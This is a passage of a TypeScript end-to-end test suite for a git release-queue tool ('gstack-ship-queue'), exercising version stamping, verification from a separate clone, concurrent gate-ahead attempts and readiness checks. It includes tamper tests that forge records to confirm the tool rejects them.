/**
 * Field list 2, W1: gstack-ship-queue over real fixture repos (bare origin,
 * lane clone, a separate coordinator clone), every git and gstack call a real
 * subprocess with a timeout. Covers stamp (journal, injected stops and
 * resume, identical retry, refusals that say what was committed), verify from
 * a separate clone (plain and gate-ahead: the merge recomputed with git
 * merge-tree, the gated tree rebuilt from the recorded stamp patch, tamper
 * and predecessor-movement controls), gate-ahead attempts (concurrent
 * preparations, out-of-order completion, a moved worktree refused) and ready
 * (pushed-head, CI-at-head and pregate refusals) with an offline gh.
 */
import { afterEach, describe, expect, test } from 'bun:test';
import { spawn, spawnSync } from 'node:child_process';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { EXIT } from '../lib/headless-artifacts';
import { SHIP_QUEUE_KEYS_VERSION } from '../lib/ship-policy';
import { receiptDigest } from '../lib/ship-queue';
import { applyStampPatch } from '../lib/ship-queue-gate';
import type { TreeReceipt } from '../lib/tree-receipt';
import { BASE_POLICY, BIN, cleanup, makeFixtureRepo, makePr, mergeMain, mergeToMain, restamp, runBin, type FixtureRepo } from './helpers/restamp-fixture';
import { coordinatorClone, ghQueueShim } from './helpers/ship-queue-fixture';
import { shippedBody } from './helpers/ship-queue-train-fixture';

const repos: FixtureRepo[] = [];
const fixture = (policy?: Record<string, unknown>, prefix?: string) => { const r = makeFixtureRepo({ ...(policy ? { policy } : {}), ...(prefix ? { prefix } : {}) }); repos.push(r); return r; };
const FULL_E2E = { ...BASE_POLICY, full_e2e: true, gate_command: 'bun run full-gate', min_gstack_version: SHIP_QUEUE_KEYS_VERSION };
afterEach(() => { while (repos.length) cleanup(repos.pop()!); });

const queue = (repo: FixtureRepo, args: string[], extraEnv: Record<string, string> = {}, cwd = repo.work) => runBin(repo, 'gstack-ship-queue', [...args, '--base', 'main'], extraEnv, cwd);
const line = (out: string, prefix: string) => out.split('\n').find(l => l.startsWith(prefix)) ?? '';
const field = (text: string, key: string) => new RegExp(`${key}=(\\S+)`).exec(text)?.[1] ?? '';
const publish = (repo: FixtureRepo, pr: string, ref = 'HEAD') => repo.git('push', '-q', '-f', 'origin', `${ref}:refs/pull/${pr}/head`);

describe('stamp, then verify from a separate clone (plain flow)', () => {
  test('QUEUE_STAMP binds head, gated and receipt; the identical retry returns it; nothing is pushed; verify agrees from the coordinator clone', () => {
    const repo = fixture();
    const gated = makePr(repo, 'pr-a', { expects: '1.2.4.0' });
    const base = repo.git('rev-parse', 'origin/main');
    const r = queue(repo, ['stamp', '--pr', '1', '--version', '1.2.4.0', '--expect-gated', gated, '--expect-base', base, '--allow-repo-commands']);
    expect(r.status).toBe(EXIT.ok);
    const stampLine = line(r.out, 'QUEUE_STAMP:');
    const head = repo.git('rev-parse', 'HEAD');
    expect(stampLine).toMatch(new RegExp(`^QUEUE_STAMP: 1 1\\.2\\.4\\.0 head=${head} gated=${gated} tree=same-modulo-stamps receipt=[0-9a-f]{64}$`));
    expect(repo.git('rev-parse', 'HEAD^')).toBe(gated);
    expect(repo.git('log', '-1', '--format=%s')).toBe('v1.2.4.0 chore(release): queue stamp onto main (#1)');
    expect(repo.git('status', '--porcelain', '--untracked-files=no')).toBe('');
    expect(r.out).toMatch(/^stage preflight: done/m);
    expect(r.out).toMatch(/^GSTACK_RESULT: skill=ship-queue status=complete run=\.gstack\/tmp\/ship-queue\/stamp-1\.json$/m);
    expect(repo.git('ls-remote', 'origin')).not.toContain('pr-a');
    const again = queue(repo, ['stamp', '--pr', '1', '--version', '1.2.4.0', '--expect-gated', gated, '--expect-base', base, '--allow-repo-commands']);
    expect(again.status).toBe(EXIT.ok);
    expect(line(again.out, 'QUEUE_STAMP:')).toBe(stampLine);
    expect(again.out).toContain('note: identical retry');
    expect(repo.git('rev-parse', 'HEAD')).toBe(head);

    publish(repo, '1');
    const coord = coordinatorClone(repo);
    const receipt = field(stampLine, 'receipt');
    const v = queue(repo, ['verify', '--pr', '1', '--gated', gated, '--receipt', receipt, '--expect-head', head], {}, coord);
    expect(v.status).toBe(EXIT.ok);
    expect(line(v.out, 'VERIFY:')).toBe(`VERIFY: 1 1.2.4.0 head=${head} gated=${gated} tree=same-modulo-stamps receipt=${receipt}`);
    expect(v.out).toContain(`MERGE_CONDITION: sha=${head}`);
    const wrong = queue(repo, ['verify', '--pr', '1', '--gated', gated, '--receipt', '0'.repeat(64)], {}, coord);
    expect(wrong.status).toBe(EXIT.fail);
    expect(wrong.err).toContain('(QUEUE_VERIFY_MISMATCH)');
  }, 180_000);

  test('a later real edit pushed after the stamp fails verify with the residual path', () => {
    const repo = fixture();
    const gated = makePr(repo, 'pr-a');
    expect(queue(repo, ['stamp', '--pr', '1', '--version', '1.2.4.0', '--expect-gated', gated, '--expect-base', repo.git('rev-parse', 'origin/main'), '--allow-repo-commands']).status).toBe(EXIT.ok);
    fs.appendFileSync(path.join(repo.work, 'pr-a.txt'), 'late\n');
    repo.git('commit', '-qam', 'late edit');
    publish(repo, '1');
    const v = queue(repo, ['verify', '--pr', '1', '--gated', gated], {}, coordinatorClone(repo));
    expect(v.status).toBe(EXIT.fail);
    expect(v.err).toMatch(/differs from the gated tree beyond stamps: pr-a\.txt.*\(QUEUE_VERIFY_MISMATCH\)/);
  }, 180_000);
});

describe('stamp journal, resume and refusals', () => {
  for (const stage of ['restamp', 'commit'] as const) {
    test(`a stop after ${stage} reports what was committed; the identical command resumes at the next stage`, () => {
      const repo = fixture();
      const gated = makePr(repo, 'pr-a');
      const args = ['stamp', '--pr', '1', '--version', '1.2.4.0', '--expect-gated', gated, '--expect-base', repo.git('rev-parse', 'origin/main'), '--allow-repo-commands'];
      const stopped = queue(repo, args, { GSTACK_SHIP_QUEUE_FAIL_AFTER: stage });
      expect(stopped.status).toBe(EXIT.refused);
      const committed = repo.git('rev-parse', 'HEAD') !== gated;
      expect(committed).toBe(stage === 'commit');
      expect(line(stopped.out, 'QUEUE_STAMP_REFUSED:')).toBe(`QUEUE_STAMP_REFUSED: 1 head=${repo.git('rev-parse', 'HEAD')} committed=${committed ? `yes ${repo.git('rev-parse', 'HEAD')}` : 'no'} stage=${stage}`);
      expect(stopped.err).toContain(`injected failure after ${stage}`);
      if (stage === 'restamp') expect(repo.git('status', '--porcelain', '--untracked-files=no')).toContain('VERSION');
      const resumed = queue(repo, args);
      expect(resumed.status).toBe(EXIT.ok);
      expect(line(resumed.out, 'QUEUE_STAMP:')).toContain(`gated=${gated} tree=same-modulo-stamps`);
      expect(repo.git('rev-list', '--count', `${gated}..HEAD`)).toBe('1');
      const journal = JSON.parse(fs.readFileSync(path.join(repo.work, '.gstack/tmp/ship-queue/stamp-1.json'), 'utf8'));
      expect(journal.stages.map((s: any) => `${s.name}:${s.status}`)).toEqual(['preflight:done', 'restamp:done', 'commit:done', 'receipt:done']);
    }, 180_000);
  }

  test('a moved base, a tree beyond the gated one and a missing full_e2e gate refuse with nothing written', () => {
    const repo = fixture({ ...BASE_POLICY, full_e2e: true, min_gstack_version: SHIP_QUEUE_KEYS_VERSION });
    const gated = makePr(repo, 'pr-a');
    const base = repo.git('rev-parse', 'origin/main');
    const stale = queue(repo, ['stamp', '--pr', '1', '--version', '1.2.4.0', '--expect-gated', gated, '--expect-base', 'deadbeef', '--allow-repo-commands']);
    expect(stale.status).toBe(EXIT.refused);
    expect(stale.err).toContain('(QUEUE_STALE)');
    expect(line(stale.out, 'QUEUE_STAMP_REFUSED:')).toBe(`QUEUE_STAMP_REFUSED: 1 head=${gated} committed=no stage=preflight`);
    const gateless = queue(repo, ['stamp', '--pr', '1', '--version', '1.2.4.0', '--expect-gated', gated, '--expect-base', base, '--allow-repo-commands']);
    expect(gateless.err).toMatch(/no gate result bound to .*\(QUEUE_GATE_MISSING\)/);
    const log = path.join(repo.root, 'gate.log');
    fs.writeFileSync(log, 'FAIL 1\n');
    expect(queue(repo, ['stamp', '--pr', '1', '--version', '1.2.4.0', '--expect-gated', gated, '--expect-base', base, '--allow-repo-commands', '--gate-exit', '1', '--gate-log', log]).err).toContain('exited 1');
    fs.appendFileSync(path.join(repo.work, 'pr-a.txt'), 'after the gate\n');
    repo.git('commit', '-qam', 'after the gate');
    const beyond = queue(repo, ['stamp', '--pr', '1', '--version', '1.2.4.0', '--expect-gated', gated, '--expect-base', base, '--allow-repo-commands', '--gate-exit', '0', '--gate-log', log]);
    expect(beyond.err).toMatch(/beyond stamps \(pr-a\.txt\).*\(QUEUE_PROOF_MISSING\)/);
    expect(repo.git('status', '--porcelain', '--untracked-files=no')).toBe('');
    expect(repo.git('log', '-1', '--format=%s')).toBe('after the gate');
  }, 180_000);
});

/** #1 stamped and published; #2 branched with its own [Unreleased] entry. */
function twoLanes(policy?: Record<string, unknown>, prefix?: string) {
  const repo = fixture(policy, prefix);
  makePr(repo, 'pr-a', { expects: '1.2.4.0' });
  expect(restamp(repo, ['--next', '--pr', '1']).status).toBe(EXIT.ok);
  repo.git('commit', '-qam', 'stamp a');
  publish(repo, '1');
  const bHead = makePr(repo, 'pr-b', { expects: '1.2.4.0' });
  return { repo, bHead };
}

function prepare(repo: FixtureRepo): { out: string; attempt: string; record: string; worktree: string; gated: string; status: number | null; err: string } {
  const r = queue(repo, ['gate-ahead', '--after', '1', '--pr', '2', '--predecessor-ref', 'pr-a', '--allow-repo-commands']);
  return { ...r, out: r.out, attempt: field(line(r.out, 'GATE_AHEAD:'), 'attempt'), gated: field(line(r.out, 'GATE_AHEAD:'), 'gated'), record: line(r.out, 'record: ').slice(8), worktree: line(r.out, 'worktree: ').slice(10) };
}

describe('gate-ahead, then stamp and verify from a separate clone', () => {
  test('the record reproduces from the PR alone: merge-tree, stamp patch, receipt digest; tamper and predecessor movement fail', () => {
    const { repo, bHead } = twoLanes({ ...BASE_POLICY, gate_command: 'node -e "process.exit(0)"', min_gstack_version: SHIP_QUEUE_KEYS_VERSION });
    const p = prepare(repo);
    expect(p.status).toBe(EXIT.ok);
    expect(line(p.out, 'GATE_COMMAND:')).toBe('GATE_COMMAND: node -e "process.exit(0)"');
    expect(repo.git('rev-parse', 'HEAD')).toBe(bHead);
    const log = path.join(repo.root, 'gate.log');
    fs.writeFileSync(log, 'all passed\n');
    const rec = queue(repo, ['gate-ahead', '--record', '--pr', '2', '--attempt', p.attempt, '--exit', '0', '--log', log]);
    expect(rec.status).toBe(EXIT.ok);
    expect(line(rec.out, 'GATE_RECORD:')).toMatch(new RegExp(`^GATE_RECORD: pr=2 attempt=${p.attempt} exit=0 gated_tree=[0-9a-f]{40} log_sha256=[0-9a-f]{64} current=yes$`));
    expect(fs.existsSync(p.worktree)).toBe(false);
    expect(fs.existsSync(path.join(path.dirname(p.record), `${p.attempt}.log`))).toBe(true);

    mergeToMain(repo, 'pr-a');
    repo.git('checkout', '-q', 'pr-b');
    mergeMain(repo);
    const base = repo.git('rev-parse', 'origin/main');
    const s = queue(repo, ['stamp', '--pr', '2', '--version', '1.2.5.0', '--expect-gated', p.gated, '--expect-base', base, '--allow-repo-commands']);
    expect(s.status).toBe(EXIT.ok);
    expect(s.out).toMatch(/^stage preflight: done \(.*gate exit 0 \(gate-ahead attempt /m);
    const receipt = field(line(s.out, 'QUEUE_STAMP:'), 'receipt');
    publish(repo, '2');
    const coord = coordinatorClone(repo);
    const v = queue(repo, ['verify', '--pr', '2', '--record', p.record, '--receipt', receipt], {}, coord);
    expect(v.status).toBe(EXIT.ok);
    expect(line(v.out, 'VERIFY:')).toMatch(new RegExp(`^VERIFY: 2 1\\.2\\.5\\.0 head=${repo.git('rev-parse', 'HEAD')} gated=${p.gated} tree=same-modulo-stamps receipt=${receipt}$`));
    expect(v.out).toMatch(/^merge_tree: [0-9a-f]{40} reproduced by git merge-tree --write-tree /m);
    expect(v.out).toMatch(/^gated_tree: [0-9a-f]{40} reproduced from the recorded stamp patch \(stamps only/m);
    expect(v.out).toMatch(/^gate: exit 0 log_sha256=/m);

    const record = JSON.parse(fs.readFileSync(p.record, 'utf8'));
    const tamper = (mutate: (r: any) => void) => { const r = JSON.parse(JSON.stringify(record)); mutate(r); const f = path.join(repo.root, 'tampered.json'); fs.writeFileSync(f, JSON.stringify(r)); return queue(repo, ['verify', '--pr', '2', '--record', f], {}, coord); };
    const forgedPatch = record.stamp_patch + 'diff --git a/pr-b.txt b/pr-b.txt\n--- a/pr-b.txt\n+++ b/pr-b.txt\n@@ -1 +1 @@\n-pr-b\n+pr-b sneaky\n';
    const forgedTree = applyStampPatch(coord, record.merge_tree, forgedPatch);
    expect('tree' in forgedTree).toBe(true);
    const sneaky = tamper(r => { r.stamp_patch = forgedPatch; r.gated_tree = (forgedTree as { tree: string }).tree; });
    expect(sneaky.status).toBe(EXIT.fail);
    expect(sneaky.err).toMatch(/the recorded stamp patch changes more than stamps: pr-b\.txt.*\(QUEUE_VERIFY_MISMATCH\)/);
    expect(tamper(r => { r.gated_tree = '0'.repeat(40); }).err).toMatch(/not the recorded gated tree 000000000000/);
    expect(tamper(r => { r.merge_tree = '0'.repeat(40); }).err).toMatch(/git merge-tree gives .*the record says 000000000000/);
    expect(tamper(r => { r.result.exit = 2; }).err).toContain('(QUEUE_GATE_MISSING)');

    repo.git('checkout', '-q', 'pr-a');
    fs.appendFileSync(path.join(repo.work, 'pr-a.txt'), 'late\n');
    repo.git('commit', '-qam', 'late predecessor fix');
    publish(repo, '1');
    const moved = queue(repo, ['verify', '--pr', '2', '--record', p.record], {}, coord);
    expect(moved.status).toBe(EXIT.fail);
    expect(moved.err).toMatch(/PREDECESSOR MOVED: #1 is at .*\(QUEUE_VERIFY_MISMATCH\)/);
  }, 240_000);
});

function runAsync(repo: FixtureRepo, args: string[]): Promise<{ status: number | null; out: string; err: string }> {
  return new Promise(resolve => {
    const child = spawn(BIN('gstack-ship-queue'), [...args, '--base', 'main'], { cwd: repo.work, env: { ...process.env, ...repo.env }, timeout: 120_000 });
    let out = '', err = '';
    child.stdout.on('data', d => { out += d; });
    child.stderr.on('data', d => { err += d; });
    child.on('close', status => resolve({ status, out, err }));
  });
}

describe('gate-ahead attempts', () => {
  test('concurrent preparations get their own worktrees; completing out of order never replaces the newest attempt', async () => {
    const { repo } = twoLanes();
    const args = ['gate-ahead', '--after', '1', '--pr', '2', '--predecessor-ref', 'pr-a', '--allow-repo-commands'];
    const [a, b] = await Promise.all([runAsync(repo, args), runAsync(repo, args)]);
    expect([a.status, b.status], `${a.err}\n${b.err}`).toEqual([EXIT.ok, EXIT.ok]);
    const ids = [a, b].map(r => field(line(r.out, 'GATE_AHEAD:'), 'attempt'));
    expect(new Set(ids).size).toBe(2);
    const trees = [a, b].map(r => line(r.out, 'worktree: ').slice(10));
    for (const t of trees) expect(fs.existsSync(t)).toBe(true);
    const list = queue(repo, ['gate-ahead', '--list', '--pr', '2']).out.split('\n').filter(l => l.startsWith('ATTEMPT:'));
    expect(list).toHaveLength(2);
    const [older, newer] = list.map(l => l.split(' ')[1]!);
    expect(list[1]).toContain(' current');
    const log = path.join(repo.root, 'gate.log');
    fs.writeFileSync(log, 'ok\n');
    const first = queue(repo, ['gate-ahead', '--record', '--pr', '2', '--attempt', newer!, '--exit', '0', '--log', log]);
    expect(line(first.out, 'GATE_RECORD:')).toContain('current=yes');
    expect(fs.existsSync(trees[ids.indexOf(older!)]!)).toBe(true);
    const late = queue(repo, ['gate-ahead', '--record', '--pr', '2', '--attempt', older!, '--exit', '0', '--log', log]);
    expect(late.status).toBe(EXIT.ok);
    expect(line(late.out, 'GATE_RECORD:')).toContain(`current=no (superseded by ${newer})`);
    expect(queue(repo, ['gate-ahead', '--list', '--pr', '2']).out).toMatch(new RegExp(`^ATTEMPT: ${newer} state=recorded .* exit=0 current$`, 'm'));
    const repeat = queue(repo, ['gate-ahead', '--record', '--pr', '2', '--attempt', older!, '--exit', '0', '--log', log]);
    expect(repeat.out).toContain('note: identical retry');
    const changed = queue(repo, ['gate-ahead', '--record', '--pr', '2', '--attempt', older!, '--exit', '1', '--log', log]);
    expect(changed.status).toBe(EXIT.refused);
    expect(changed.err).toContain('(GATE_AHEAD_ATTEMPT_INVALID)');
  }, 240_000);

  test('a worktree that no longer holds the gated commit cannot bind a result', () => {
    const { repo } = twoLanes();
    const p = prepare(repo);
    fs.appendFileSync(path.join(p.worktree, 'pr-b.txt'), 'edited by the gate\n');
    const log = path.join(repo.root, 'gate.log');
    fs.writeFileSync(log, 'ok\n');
    const r = queue(repo, ['gate-ahead', '--record', '--pr', '2', '--attempt', p.attempt, '--exit', '0', '--log', log]);
    expect(r.status).toBe(EXIT.refused);
    expect(r.err).toMatch(/no longer holds the gated commit .*tracked edits.*\(GATE_AHEAD_ATTEMPT_INVALID\)/);
    expect(fs.existsSync(p.worktree)).toBe(true);
    expect(queue(repo, ['gate-ahead', '--record', '--pr', '2', '--attempt', 'nope', '--exit', '0', '--log', log]).err).toContain('no gate-ahead attempt nope for #2');
  }, 180_000);
});

describe('ready', () => {
  function pregateFor(repo: FixtureRepo, head: string): string {
    const tree = runBin(repo, 'gstack-wtree', []).out.trim();
    const file = path.join(repo.root, 'pregate.json');
    fs.writeFileSync(file, JSON.stringify({ schema_version: 1, tree, head, verdict: 'pass', checks: [{ id: 'unit', status: 'pass' }] }));
    return file;
  }
  const green = { check_runs: [{ status: 'completed', conclusion: 'success' }, { status: 'completed', conclusion: 'skipped' }] };

  test('one READY block about the exact pushed head; refusals for an unpushed head, red CI and a stale pregate', () => {
    const repo = fixture();
    const head = makePr(repo, 'pr-a');
    const pregate = pregateFor(repo, head);
    const shim = (prHead: string, checks: unknown, body = shippedBody('1', head)) => ghQueueShim(repo, { prs: { '1': { headRefOid: prHead, url: 'https://github.com/o/r/pull/1', body } }, checks: { [head]: checks } });
    const ok = queue(repo, ['ready', '--pr', '1', '--pregate', pregate], shim(head, green));
    expect(ok.status).toBe(EXIT.ok);
    const lines = ok.out.split('\n');
    expect(lines[0]).toBe(`READY #1 ${head} STAMP_VERSION=unstamped`);
    expect(lines.slice(1, 9)).toEqual([
      'pr: https://github.com/o/r/pull/1', `head: ${head}`, 'version: unstamped', `base: origin/main@${repo.git('rev-parse', 'origin/main')}`,
      `ci: green at ${head.slice(0, 12)} (passed=1 failed=0 pending=0 skipped=1)`, expect.stringMatching(/^PREGATE: pass tree=[0-9a-f]{12} head=[0-9a-f]{12} checks=1$/),
      'gate: command=none full_e2e=no gate-ahead=none', `SHIP_RECEIPT: pr=1 head=${head.slice(0, 12)} version=- base=main`,
    ]);
    const unshipped = queue(repo, ['ready', '--pr', '1', '--pregate', pregate], shim(head, green, 'no receipt'));
    expect(unshipped.status).toBe(EXIT.refused);
    expect(unshipped.out).toContain('SHIP_RECEIPT: none in the PR body');
    expect(unshipped.err).toMatch(/PR #1's body carries no ship receipt; fix: run \/ship on the branch .*\(QUEUE_RECEIPT_MISSING\)/);
    const broken = queue(repo, ['ready', '--pr', '1', '--pregate', pregate], shim(head, green, '```gstack-ship-receipt\n{"schema_version":1}\n```\n'));
    expect(broken.status).toBe(EXIT.refused);
    expect(broken.out).toContain('SHIP_RECEIPT: invalid in the PR body');
    expect(broken.err).toMatch(/ship receipt is invalid \(.*head.*\).*\(QUEUE_RECEIPT_MISSING\)/);
    const stale = queue(repo, ['ready', '--pr', '1', '--pregate', pregate], shim(head, green, shippedBody('1', 'e'.repeat(40))));
    expect(stale.status).toBe(EXIT.refused);
    expect(stale.out).toContain(`SHIP_RECEIPT: pr=1 head=eeeeeeeeeeee version=- base=main`);
    expect(stale.err).toMatch(new RegExp(`PR #1's ship receipt is for eeeeeeeeeeee, not the head ${head.slice(0, 12)} being merged.*\\(QUEUE_RECEIPT_STALE\\)`));
    const unpushed = queue(repo, ['ready', '--pr', '1', '--pregate', pregate], shim('f'.repeat(40), green));
    expect(unpushed.status).toBe(EXIT.refused);
    expect(unpushed.err).toMatch(/is not PR #1's pushed head ffffffffffff.*\(QUEUE_NOT_READY\)/);
    const red = queue(repo, ['ready', '--pr', '1', '--pregate', pregate], shim(head, { check_runs: [{ status: 'completed', conclusion: 'failure' }, { status: 'in_progress', conclusion: null }] }));
    expect(red.err).toMatch(/CI is not green at .*pending at [0-9a-f]{12} \(passed=0 failed=1 pending=1 skipped=0\).*\(QUEUE_NOT_READY\)/);
    fs.appendFileSync(path.join(repo.work, 'pr-a.txt'), 'more\n');
    repo.git('commit', '-qam', 'more');
    const moved = repo.git('rev-parse', 'HEAD');
    const stalePregate = queue(repo, ['ready', '--pr', '1', '--pregate', pregate], ghQueueShim(repo, { prs: { '1': { headRefOid: moved, body: shippedBody('1', moved) } }, checks: { [moved]: green } }));
    expect(stalePregate.status).toBe(EXIT.refused);
    expect(stalePregate.out).toMatch(/^PREGATE: pass .* \(PREGATE_STALE\)$/m);
    // A lane that cleared its pregate from a separate clone (gstack-pregate --remote cannot run in a worktree) holds the verdict under
    // <state root>/pregate/by-tree/<tree>.json; ready reads that mirror for the current tree when its own record is stale or missing, and only a run
    // that holds the tests stage (what `--stage tests --remote` writes: checks=[lanes]) against origin/main under a reviewed policy stands in: a
    // --only timing run, another base or a head policy is named on the PREGATE line instead.
    const stateRoot = path.join(repo.root, 'state-root');
    const complete = { base: `origin/main@${repo.git('rev-parse', 'origin/main').slice(0, 12)}`, policy: 'origin/main@abc (no .gstack/pregate.json)', checks: [{ id: 'lanes', status: 'pass' }] };
    const fromSuffix = `(from the state root's pregate/by-tree/${'TREE'}.json, recorded by another checkout)`;
    const movedShim = ghQueueShim(repo, { prs: { '1': { headRefOid: moved, body: shippedBody('1', moved) } }, checks: { [moved]: green } });
    const movedTree = runBin(repo, 'gstack-wtree', []).out.trim();
    const mirror = path.join(stateRoot, 'pregate', 'by-tree', `${movedTree}.json`);
    fs.mkdirSync(path.dirname(mirror), { recursive: true });
    fs.writeFileSync(path.join(stateRoot, 'pregate', 'by-tree', `${'0'.repeat(movedTree.length)}.json`), JSON.stringify({ schema_version: 1, tree: '0'.repeat(movedTree.length), head: moved, verdict: 'pass', ...complete }));
    const otherTree = queue(repo, ['ready', '--pr', '1', '--pregate', pregate], { ...movedShim, GSTACK_STATE_ROOT: stateRoot });
    expect(otherTree.status).toBe(EXIT.refused);
    expect(otherTree.out).toMatch(/^PREGATE: pass .* \(PREGATE_STALE\)$/m);
    const missing = queue(repo, ['ready', '--pr', '1'], { ...movedShim, GSTACK_STATE_ROOT: stateRoot });
    expect(missing.status).toBe(EXIT.refused);
    expect(missing.out).toMatch(/^PREGATE: missing \(\.gstack\/tmp\/pregate\.json; run gstack-pregate run --allow-repo-commands\)$/m);
    const suffix = fromSuffix.replace('TREE', movedTree.slice(0, 12));
    const partial = { ...complete, checks: [{ id: 'timing', status: 'pass' }] };
    for (const [bad, why] of [[partial, 'a run without the tests stage (lanes)'], [{ ...complete, base: 'origin/develop@0123456789ab' }, 'recorded against origin/develop@0123456789ab, not origin/main'], [{ ...complete, policy: 'head (unreviewed) .gstack/pregate.json' }, 'recorded under the unreviewed head policy']] as const) {
      fs.writeFileSync(mirror, JSON.stringify({ schema_version: 1, tree: movedTree, head: moved, verdict: 'pass', ...bad }));
      const ignored = queue(repo, ['ready', '--pr', '1'], { ...movedShim, GSTACK_STATE_ROOT: stateRoot });
      expect(ignored.status).toBe(EXIT.refused);
      expect(line(ignored.out, 'PREGATE:')).toBe(`PREGATE: missing (.gstack/tmp/pregate.json; run gstack-pregate run --allow-repo-commands); the state root's mirror for this tree cannot stand in: ${why}`);
    }
    fs.writeFileSync(mirror, JSON.stringify({ schema_version: 1, tree: movedTree, head: moved, verdict: 'pass', ...complete }));
    const fromMirror = queue(repo, ['ready', '--pr', '1', '--pregate', pregate], { ...movedShim, GSTACK_STATE_ROOT: stateRoot });
    expect([fromMirror.status, fromMirror.err]).toEqual([EXIT.ok, '']);
    expect(line(fromMirror.out, 'PREGATE:')).toBe(`PREGATE: pass tree=${movedTree.slice(0, 12)} head=${moved.slice(0, 12)} checks=1 ${suffix}`);
    const missingFromMirror = queue(repo, ['ready', '--pr', '1'], { ...movedShim, GSTACK_STATE_ROOT: stateRoot });
    expect([missingFromMirror.status, missingFromMirror.err]).toEqual([EXIT.ok, '']);
    expect(line(missingFromMirror.out, 'PREGATE:')).toContain(suffix);
    const current = queue(repo, ['ready', '--pr', '1', '--pregate', pregateFor(repo, moved)], { ...movedShim, GSTACK_STATE_ROOT: stateRoot });
    expect([current.status, current.err]).toEqual([EXIT.ok, '']);
    expect(line(current.out, 'PREGATE:')).toBe(`PREGATE: pass tree=${movedTree.slice(0, 12)} head=${moved.slice(0, 12)} checks=1`);
    // Value: protects=a same-tree record that only waits on a remote receipt (the small-machine run) is cleared by the clone's mirror, an
    // unreadable record falls through to the mirror, and a record whose own checks failed or stayed incomplete is never overridden by a green mirror,
    // including an incomplete check the environment caused (PREGATE_ENVIRONMENT, #3480: a secrets scanner that never finished is not a scanned diff);
    // fails_when=ready reads the mirror only for another tree (the documented lane case refuses PREGATE_REMOTE_UNCLEARED) or lets a mirror hide a red
    // or incomplete local run; why_new=the rows above cover only stale, missing and current records; seam=none; no_claim=the mirror's writer
    const local = path.join(repo.root, 'pregate-local.json');
    const obligation = { lane: 'pregate.json/remote_gate', platform: 'remote', workflow: 'pregate.json', job: 'remote_gate', tests: ['test/a.test.ts'], receipt: null };
    fs.writeFileSync(local, JSON.stringify({ schema_version: 1, tree: movedTree, head: moved, verdict: 'requires-remote', checks: [{ id: 'lanes', status: 'requires-remote' }], requires_remote: [obligation] }));
    const uncleared = queue(repo, ['ready', '--pr', '1', '--pregate', local], { ...movedShim, GSTACK_STATE_ROOT: stateRoot });
    expect([uncleared.status, uncleared.err]).toEqual([EXIT.ok, '']);
    expect(line(uncleared.out, 'PREGATE:')).toBe(`PREGATE: pass tree=${movedTree.slice(0, 12)} head=${moved.slice(0, 12)} checks=1 ${suffix}`);
    fs.writeFileSync(local, '{ not json');
    const unreadable = queue(repo, ['ready', '--pr', '1', '--pregate', local], { ...movedShim, GSTACK_STATE_ROOT: stateRoot });
    expect([unreadable.status, unreadable.err]).toEqual([EXIT.ok, '']);
    expect(line(unreadable.out, 'PREGATE:')).toContain(suffix);
    fs.writeFileSync(local, JSON.stringify({ schema_version: 1, tree: movedTree, head: moved, verdict: 'fail', checks: [{ id: 'lanes', status: 'fail' }] }));
    const redLocal = queue(repo, ['ready', '--pr', '1', '--pregate', local], { ...movedShim, GSTACK_STATE_ROOT: stateRoot });
    expect(redLocal.status).toBe(EXIT.refused);
    expect(line(redLocal.out, 'PREGATE:')).toBe(`PREGATE: fail tree=${movedTree.slice(0, 12)} head=${moved.slice(0, 12)} checks=1 — 1 check(s) failed: lanes (PREGATE_LANE_FAILED)`);
    fs.writeFileSync(local, JSON.stringify({ schema_version: 1, tree: movedTree, head: moved, verdict: 'incomplete', checks: [{ id: 'lanes', status: 'incomplete' }] }));
    const incompleteLocal = queue(repo, ['ready', '--pr', '1', '--pregate', local], { ...movedShim, GSTACK_STATE_ROOT: stateRoot });
    expect(incompleteLocal.status).toBe(EXIT.refused);
    expect(line(incompleteLocal.out, 'PREGATE:')).toMatch(/\(PREGATE_INCOMPLETE\)$/);
    fs.writeFileSync(local, JSON.stringify({ schema_version: 1, tree: movedTree, head: moved, verdict: 'incomplete', checks: [{ id: 'secrets', status: 'incomplete', cause: 'environment', environment: { kind: 'missing-binary', evidence: 'gstack-redact: not on PATH', proof: 'launch' } }] }));
    const environmentLocal = queue(repo, ['ready', '--pr', '1', '--pregate', local], { ...movedShim, GSTACK_STATE_ROOT: stateRoot });
    expect(environmentLocal.status).toBe(EXIT.refused);
    expect(line(environmentLocal.out, 'PREGATE:')).toMatch(/\(PREGATE_ENVIRONMENT\)$/);
    expect(environmentLocal.out).not.toContain(suffix);
    fs.appendFileSync(path.join(repo.work, 'pr-a.txt'), 'dirty\n');
    expect(queue(repo, ['ready', '--pr', '1'], shim(moved, green)).err).toMatch(/uncommitted tracked changes: pr-a\.txt.*\(QUEUE_NOT_READY\)/);
  }, 180_000);

  test('STAMP_VERSION is unstamped for a PR whose own diff leaves VERSION alone after main moved to a newer version, and the stamp for one that changes it (GST-770 follow-up)', () => {
    const repo = fixture();
    const head = makePr(repo, 'pr-a');
    repo.git('checkout', '-q', 'origin/main', '-B', 'main-moves');
    fs.writeFileSync(path.join(repo.work, 'VERSION'), '1.2.4.0\n');
    repo.git('commit', '-qam', 'v1.2.4.0 another PR landed');
    repo.git('push', '-q', 'origin', 'HEAD:main');
    repo.git('fetch', '-q', 'origin');
    repo.git('checkout', '-q', 'pr-a');
    const shim = (prHead: string) => ghQueueShim(repo, { prs: { '1': { headRefOid: prHead, url: 'https://github.com/o/r/pull/1', body: shippedBody('1', head) } }, checks: { [prHead]: green } });
    const forked = queue(repo, ['ready', '--pr', '1', '--pregate', pregateFor(repo, head)], shim(head));
    expect([forked.status, forked.err]).toEqual([EXIT.ok, '']);
    expect(forked.out.split('\n').slice(0, 4)).toEqual([`READY #1 ${head} STAMP_VERSION=unstamped`, 'pr: https://github.com/o/r/pull/1', `head: ${head}`, 'version: unstamped']);
    fs.writeFileSync(path.join(repo.work, 'VERSION'), '1.2.5.0\n');
    repo.git('commit', '-qam', 'v1.2.5.0 stamp');
    const stamped = repo.git('rev-parse', 'HEAD');
    const ok = queue(repo, ['ready', '--pr', '1', '--pregate', pregateFor(repo, stamped)], shim(stamped));
    expect(ok.out.split('\n')[0]).toBe(`READY #1 ${stamped} STAMP_VERSION=1.2.5.0`);
  }, 180_000);

  // Value: protects=the re-READY after a slot's stamp push accepts the receipt /ship wrote for the pinned head, and only then;
  // fails_when=ready binds the receipt to HEAD alone (every stamped READY turns QUEUE_RECEIPT_STALE) or accepts any ancestor's receipt;
  // why_new=the READY test above binds receipts to the exact head only; seam=none; no_claim=real gh and CI (shims; unit only)
